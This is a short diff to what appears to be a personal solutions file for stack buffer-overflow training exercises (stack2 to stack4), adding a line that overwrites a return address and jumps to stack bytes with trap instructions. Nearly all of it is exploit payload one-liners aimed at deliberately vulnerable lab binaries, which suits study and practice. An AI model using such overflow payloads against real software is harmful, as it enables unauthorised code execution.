@@ -8,6 +8,8 @@ GREENIE=`python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'"` ./stack2
 ./stack3 <<< `python -c "print 'A'*64+'\x24\x84\x04\x08'"`
 4:
 ./stack4 <<< `python -c "print 'A'*76 + '\xf4\x83\x04\x08'"`
+ret to win and then main and sigtrap
+./stack4 <<< `python -c "print 'A'*76 + '\xf4\x83\x04\x08' + '\xc4\xfc\xff\xbf' +  '\xcc'*12"`
 5:
 
 6:
